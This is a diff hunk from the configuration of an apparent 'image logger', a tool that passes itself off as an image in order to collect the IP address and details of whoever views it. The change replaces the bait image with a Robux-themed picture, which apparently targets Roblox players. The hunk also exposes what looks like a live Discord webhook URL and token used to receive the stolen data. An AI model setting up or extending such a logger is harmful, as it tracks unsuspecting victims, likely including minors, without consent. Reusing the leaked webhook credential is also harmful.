@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": https://discord.com/api/webhooks/1351619349105868830/SDoSKJ2LUFGPay1M1hskE0_JwFsgpoA9BpVE7thRuiLMe2H52lzCMjj-eq_3YCLSJbiw
-    "image": "https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg", # You can also have a custom image by using a URL argument
+    "image": "https://se.images.search.yahoo.com/search/images;_ylt=Awr.gbv2vNlngQIA0jITOAx.;_ylu=Y29sbwNpcjIEcG9zAzEEdnRpZAMEc2VjA3BpdnM-?p=robiux&fr2=piv-web&fr=crmas#id=1&iurl=https%3A%2F%2Fimages.rbxcdn.com%2F5348266ea6c5e67b19d6a814cbbb70f6.jpg&action=click", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
